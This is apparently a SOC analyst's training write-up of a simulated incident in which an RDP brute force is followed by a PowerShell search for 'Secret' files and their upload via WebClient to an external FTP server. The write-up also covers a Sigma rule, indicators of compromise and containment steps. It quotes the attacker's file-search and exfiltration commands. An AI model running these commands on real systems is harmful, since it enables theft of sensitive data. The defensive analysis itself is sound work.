
# SOC295 - Potential Data Exfiltration Detected via FTP 

## 🚨 Raw Alert Details
```text
EventID : 271
Event Time : 2024-06-25T07:15:37+03:00
Rule : SOC295 - Potential Data Exfiltration Detected via FTP
Role : Incident Responder
Alert Type : Data Leakage
Difficulty : Medium
MITRE ATT&CK : T1078, T1133, T1059.001, T1083, T1005, T1020
Hostname : Jaiden
Ip Address : 172.16.17.237
Command Line : $webClient.UploadFile($ftpUrl, "STOR", $localFilePath)
EDR Action : Allowed
Trigger Reason : An unusual file upload activity was detected. A PowerShell script was used to create and upload a file to an external FTP server.
```

## Alert Overview
- **Severity:** High
- **Detection Source:** EDR / PowerShell Script Block Logging (Event ID 4104)
- **Asset Affected:** Jaiden (172.16.17.237 - Windows 10)
- **Threat Type:** RDP Brute Force / Local Discovery / Automated Exfiltration
- **Verdict:** True Positive (Compromised & Exfiltrated)
- **Containment Status:** Contained (Isolated)

## 🧠 Attack Context / Technical Background
This incident demonstrates a classic human-operated post-exploitation attack chain: **Initial Access via Brute Force, Local File Discovery, and Automated Exfiltration.**

**The Mechanics:** After successfully brute-forcing RDP credentials to breach a perimeter host, the threat actor conducts local reconnaissance. They search the file system for sensitive documents (using recursive commands searching for keywords like "Secret"). Once valuable files are identified, the attacker uses native scripting languages (PowerShell) to stage the data and programmatically upload it to a remote, attacker-controlled cloud SFTP or FTP repository (in this case, `eu-central-1.sftpcloud.io`) using `.NET` classes like `System.Net.WebClient`.

## Investigation Steps

### 1. Initial Access Verification (RDP Brute Force)
The investigation began by reviewing authentication logs preceding the alert to determine how the attacker entered the network.
- **Firewall/OS Logs:** Captured multiple connection attempts targeting RDP (Port 3389) from external IP `169.150.218.3` (located in the Netherlands). 
- **Analysis:** The attacker successfully authenticated after a series of probes, gaining interactive remote desktop access to host `Jaiden` (`172.16.17.237`).

<img width="1452" height="499" alt="image" src="https://github.com/user-attachments/assets/5311d0eb-33fc-42d5-ac6a-3fe87e650c6d" />


### 2. Discovery Phase (Terminal History)
Reviewing the EDR Terminal History for host `Jaiden` revealed the attacker actively mapping the environment and searching for sensitive files:
- `whoami`, `whoami /groups`, `whoami /priv` (Privilege enumeration)
- `Get-LocalGroupMember -Name "Administrators"` (Group membership discovery)
- `Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Name -like '*Secret*' }` (Targeted file search for sensitive assets).
<img width="1183" height="474" alt="image" src="https://github.com/user-attachments/assets/c6ef49df-ab74-4a70-b4ce-feec6dda64aa" />




### 3. Exfiltration Phase (PowerShell WebClient)
The core trigger of the alert was captured in PowerShell Script Block Logging (Event ID 4104), which exposed the exfiltration mechanism:
- **Payload Execution:** The script created a sample file (`Top Secret.docx`), assigned it to `$localFilePath`, and invoked `System.Net.WebClient`.
- **Command:** `$webClient.UploadFile($ftpUrl, "STOR", $localFilePath)` where `$ftpUrl = "ftp://eu-central-1.sftpcloud.io/..."`.
- **Network Validation:** Firewall logs confirmed that the HTTP/FTP POST request to `eu-central-1.sftpcloud.io` was successfully permitted and completed.
- 
<img width="735" height="251" alt="image" src="https://github.com/user-attachments/assets/b4f4ea6e-af45-4007-8d01-b1f230b8f751" />

<img width="539" height="528" alt="image" src="https://github.com/user-attachments/assets/ad093512-b9d8-4134-8e20-103c72344caf" />



## Analysis & Findings
The incident is a confirmed **True Positive**. An external threat actor (`169.150.218.3`) brute-forced RDP access to the workstation `Jaiden`. Once inside, the attacker performed storage-based data collection by searching the `C:` drive for files containing the word "Secret," resulting in the targeting of `Top Secret.docx`. Finally, the attacker executed a PowerShell script utilizing `.NET` WebClient to automatically exfiltrate the file to an external SFTP cloud service (`eu-central-1.sftpcloud.io`). Data leakage has successfully occurred.

<img width="1807" height="259" alt="image" src="https://github.com/user-attachments/assets/f089a624-733d-495e-879d-198041bd0098" />


## MITRE ATT&CK Mapping
| Tactic | Technique ID | Technique Name |
| :--- | :--- | :--- |
| **Initial Access** | T1133 | External Remote Services (RDP) |
| **Credential Access** | T1110 | Brute Force |
| **Discovery** | T1083 | File and Directory Discovery (`Get-ChildItem`) |
| **Collection** | T1005 | Data from Local System (`Top Secret.docx`) |
| **Exfiltration** | T1020 | Automated Exfiltration (`System.Net.WebClient` UploadFile) |

## Indicators of Compromise (IOCs)
| Type | Value | Context |
| :--- | :--- | :--- |
| IP Address | 169.150.218.3 | Attacker RDP Brute-Force IP (Netherlands) |
| Domain | `eu-central-1.sftpcloud.io` | Attacker Cloud SFTP Drop Server |
| File Name | `Top Secret.docx` | Exfiltrated Sensitive Document |

## 🛠️ Detection Engineering & Hunting Logic
To improve automated detection of PowerShell-based WebClient exfiltration, the following Sigma rule has been engineered for deployment in the SIEM:

```yaml
title: PowerShell WebClient File Upload Exfiltration
id: e13f0599-1234-4a5e-994d-70580c5e9f09
status: experimental
description: Detects PowerShell scripts utilizing .NET WebClient UploadFile method to exfiltrate files to remote servers.
author: SOC Analyst Portfolio
logsource:
  product: windows
  service: powershell
detection:
  selection:
    EventID: 4104
    ScriptBlockText|contains:
      - 'WebClient'
      - 'UploadFile'
      - 'STOR'
  condition: selection
falsepositives:
  - Legitimate administrative backup or file transfer scripts utilizing WebClient
level: high
tags:
  - attack.t1020
  - attack.t1059.001
```

## 🚀 Decision Tree 
1. **Analyze Trigger Reason:** Did an alert fire for unusual file upload activity via PowerShell?
   - If Yes -> Examine PowerShell Script Block logs (Event ID 4104).
2. **Evaluate Collection Methods:** Did the script search for local files (`Get-ChildItem`) using sensitive keywords like "Secret", "Password", or "Confidential"?
   - *Confirmed search for `*Secret*`.*
3. **Check Exfiltration Protocol:** Did the script use `.UploadFile` or FTP/SFTP protocols to transmit data externally?
   - *Confirmed `System.Net.WebClient` uploading to `sftpcloud.io`.*
4. **Action:** **Verdict: True Positive - Compromised (Data Exfiltrated).** Immediately isolate the host, block the C2 IP, and initiate data breach protocols.

## 📝 Playbook Questions & Answers
- **Should the device be isolated?**
  - *Answer:* Yes.
  - *Reasoning:* Unauthorized access was detected from an IP located in the Netherlands, followed by local file discovery and data exfiltration. The host must be isolated immediately to prevent further data loss.
- **Verify whether a false positive or legit activity has occurred:**
  - *Answer:* True Positive.
  - *Reasoning:* The attacker gained access via brute force, obtained 'Top Secret.docx', and successfully uploaded it to `eu-central-1.sftpcloud.io` as confirmed by firewall logs.
- **Detect and Investigate Data Exfiltration:**
  - *Answer:* Automated Exfiltration (T1020).
  - *Reasoning:* The command `$webClient.UploadFile($ftpUrl, "STOR", $localFilePath)` is part of a PowerShell script designed to automatically exfiltrate collected files to a remote server.
- **Interaction-Based Data Collection Techniques:**
  - *Answer:* None.
  - *Reasoning:* The data was harvested automatically via scripting rather than interactive manual user theft.
- **Storage-Based Data Collection Techniques:**
  - *Answer:* Data from Local System (T1005).
  - *Reasoning:* The command `Get-ChildItem -Path C:\ -Recurse ... -like '*Secret*'` was used to search and collect critical files directly from the local system storage.

## Response & Containment Actions Taken
- **Host Isolation:** The compromised endpoint (`Jaiden / 172.16.17.237`) was immediately **Isolated** from the network via EDR to halt ongoing exfiltration.
- **Perimeter Blocking:** The attacker IP (`169.150.218.3`) and the SFTP cloud domain (`eu-central-1.sftpcloud.io`) were added to the perimeter blocklist.
- **Why:** Isolating the host stops active data leakage and prevents the adversary from establishing further persistence.

## Recommendations
1. **RDP Exposure Hardening:** Remove public internet access to RDP (Port 3389). Mandate VPN access with Multi-Factor Authentication (MFA) for all remote administrative sessions.
2. **Data Loss Prevention (DLP):** Implement DLP policies on endpoints to alert or block unauthorized scripts from accessing and uploading files containing keywords like "Secret" or "Confidential" to external cloud services.
3. **Credential Audit:** Force a password reset for the user account compromised during the brute-force attack and audit local group memberships.

## ⚖️ Mistakes and Lessons Learned
- **Analyst Reflection (Playbook Taxonomy - Exfiltration vs Collection):** During the playbook completion, I initially selected "Exfiltration Over Alternative Protocol" and "Automated Collection", which were marked as incorrect by the simulator.
- **The Lesson:** Precision in MITRE mapping matters. The platform specifically classified the exfiltration method as **Automated Exfiltration (T1020)** due to the scripted `.UploadFile` execution, and classified the collection method as **Data from Local System (T1005)** because the file search targeted local storage rather than remote repositories. Learning these exact taxonomy mappings prevents lost points in future investigations.

## 🛠️ Skills & Tools Used
- PowerShell Script Block Analysis (Event ID 4104)
- EDR Terminal History Forensics (`Get-ChildItem`, `UploadFile`)
- Firewall & Proxy Log Correlation (Verifying successful FTP/SFTP upload traffic)
- Threat Intelligence Correlation (AbuseIPDB)
- Incident Containment (Host Isolation)
